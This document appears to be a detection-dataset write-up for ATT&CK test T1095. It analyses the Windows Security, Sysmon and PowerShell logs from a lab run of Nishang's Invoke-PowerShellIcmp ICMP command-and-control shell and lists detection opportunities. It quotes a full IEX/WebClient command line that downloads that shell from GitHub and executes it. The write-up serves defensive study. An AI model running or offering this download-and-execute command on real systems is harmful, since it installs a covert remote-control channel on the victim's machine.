# T1095-1: Non-Application Layer Protocol — ICMP C2

## Technique Context

T1095 (Non-Application Layer Protocol) covers adversary C2 communications that operate below or outside the standard application layer, using protocols like ICMP, UDP, or raw sockets in ways not intended by the protocol designers. ICMP-based C2 is particularly attractive to attackers because:

- ICMP traffic is rarely monitored at the depth of HTTP/HTTPS; many organizations lack tools capable of deep packet inspection of ICMP payload content
- ICMP is broadly permitted through perimeter firewalls as part of basic network health monitoring
- ICMP-encapsulated commands blend visually with normal ping traffic in volume-based monitoring

The Nishang framework's `Invoke-PowerShellIcmp` module is a well-documented PowerShell implementation of ICMP C2. It works by encoding PowerShell commands in ICMP echo request and reply payloads, effectively turning the ICMP stream into a bidirectional command-and-control channel. An operator sends commands embedded in ICMP echo requests to the compromised host; the shell executes them and returns output in ICMP echo replies.

This test downloads `Invoke-PowerShellIcmp.ps1` from GitHub via WebClient, then executes `Invoke-PowerShellIcmp -IPAddress 127.0.0.1` to demonstrate ICMP C2 setup (using loopback as a safe lab target).

## What This Dataset Contains

The dataset spans approximately fifteen seconds (2026-03-14T23:38:49Z–23:39:04Z) on ACME-WS06.acme.local and contains 162 events across four channels.

**The core attack command** appears in Security EID 4688 (PowerShell, PID not directly captured in the sample) with the full command line:

```
"powershell.exe" & {IEX (New-Object System.Net.WebClient).Downloadstring(
  'https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress 127.0.0.1}
```

This command line is unambiguous: it performs an in-memory download of `Invoke-PowerShellIcmp.ps1` from a pinned GitHub commit and immediately executes it with `IEX` (Invoke-Expression), then calls the function targeting loopback. With Defender disabled, this download and in-memory execution proceeds without blocking.

**Security EID 4688** also captures `whoami.exe` (twice) and `sdbinst.exe` running from SYSTEM context. The `sdbinst.exe -m -bg` execution (application compatibility database installer, background mode) is an OS-level background task unrelated to the test — it ran concurrently and appears in the dataset as ambient noise.

**Sysmon EID 1** (2 events) captures:
- `sdbinst.exe` (PID 4724, rule `technique_id=T1546.011,technique_name=Application Shimming`): `C:\Windows\System32\sdbinst.exe -m -bg` spawned by `svchost.exe`. This is a legitimate background compatibility update — the T1546.011 rule tag reflects Sysmon's behavioral rule matching for any `sdbinst.exe` execution, not a malicious shim.
- `whoami.exe` (PID 260, rule `T1033`): standard test framework environment check.

Note that the PowerShell process executing the IEX download is not captured as a Sysmon EID 1 — it appears only in the Security channel. This suggests the PowerShell process creation was not in scope for the Sysmon ProcessCreate filter at this point in the test sequence, or the relevant sample was excluded from the 20-event Sysmon sample set due to prioritization of other event IDs.

**Sysmon EID 7** (25 events) documents DLL loads for PowerShell processes across the test. `System.Management.Automation.ni.dll` appears with rule `T1059.001`.

**Sysmon EID 10** (4 events) shows process access events with 0x1FFFFF access mask.

**Sysmon EID 11** (4 events) captures file creation events: two `.sdb` compatibility database files created by `sdbinst.exe` at `C:\Windows\apppatch\MergeSdbFiles\`, and two PowerShell startup profile data files. The `.sdb` creations are background OS activity.

**Sysmon EID 17** (3 events) records named pipe creation from PowerShell.

**PowerShell EID 4104** (104 events) and **EID 4103** (2 events) capture the script block session. The `Write-Host "DONE"` output binding appears in an EID 4103 pipeline execution event (host application `powershell`, command `Write-Host`), confirming successful execution of the test body. The EID 4103 context shows `ACME\SYSTEM` as the user.

**Application channel** (1 event, EID 15): `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON` — this is the Application channel's record of Defender status, logged as background telemetry on this system.

## What This Dataset Does Not Contain

No Sysmon EID 3 (network connection) events appear. The IEX download from GitHub (`raw.githubusercontent.com`) would normally generate a network connection event if the host has internet access and the download succeeded; its absence is notable. In the lab environment, external internet connectivity may be restricted. The ICMP C2 connection to 127.0.0.1 would also generate no EID 3 since Sysmon typically does not capture loopback connections.

The `Invoke-PowerShellIcmp.ps1` content itself — which would have been downloaded into memory — is not captured in EID 4104 script block logging. IEX of a remotely downloaded script logs the invocation (`IEX ...`) but not the content of the downloaded script as a separate block unless PowerShell decompiles it during execution. This is a known gap in script block logging for IEX-based in-memory execution.

No ICMP packet captures appear; those require network monitoring infrastructure, not endpoint telemetry.

## Assessment

With Defender disabled, the IEX download-and-execute pattern ran without interference. The complete command line including the GitHub URL and `Invoke-PowerShellIcmp -IPAddress 127.0.0.1` is captured in Security EID 4688. This is a significant difference from the defended variant, where Defender would detect and block the AMSI-flagged download string or the Nishang module's known signatures.

Compared to the defended variant (43 Sysmon, 10 Security, 35 PowerShell), the undefended dataset is substantially larger in Sysmon (50 vs. 43) and PowerShell (106 vs. 35). The PowerShell channel growth reflects fuller script block logging without AMSI truncation. The additional Sysmon events reflect more complete process and DLL load coverage without Defender interference.

The `Write-Host "DONE"` EID 4103 event in this dataset confirms successful test execution — an artifact absent in the defended variant, where blocking would prevent this completion marker from being written.

## Detection Opportunities Present in This Data

**IEX + WebClient download of Nishang ICMP shell**: Security EID 4688 preserves the full command line including the GitHub URL pinned to a specific commit hash of the Nishang repository. The combination of `IEX`, `New-Object System.Net.WebClient`, and `Invoke-PowerShellIcmp` is highly distinctive. Any detection on PowerShell command lines containing `Invoke-PowerShellIcmp` or the Nishang URL pattern will match this behavior.

**IEX (Invoke-Expression) on WebClient download**: Even without the specific Nishang URL, the pattern of `IEX (New-Object System.Net.WebClient).Downloadstring(...)` in a PowerShell command line is a well-known living-off-the-land download-and-execute pattern. EID 4688 captures this completely.

**PowerShell EID 4104 + EID 4103 completion marker**: The `Write-Host "DONE"` in EID 4103 confirms test body execution. In a production detection context, anomalous PowerShell sessions that execute network-based tool downloads and reach a completion state are worth correlating with the preceding download command.

**`sdbinst.exe -m -bg` (background OS activity)**: The concurrent `sdbinst.exe` with Sysmon rule `T1546.011` is background OS activity from the compatibility subsystem, not attack-related. This is an example of legitimate OS behavior that shares rule tags with adversary techniques — a reminder that Sysmon rule matches require contextual enrichment (parent process, timing, concurrency) to distinguish from actual technique use.
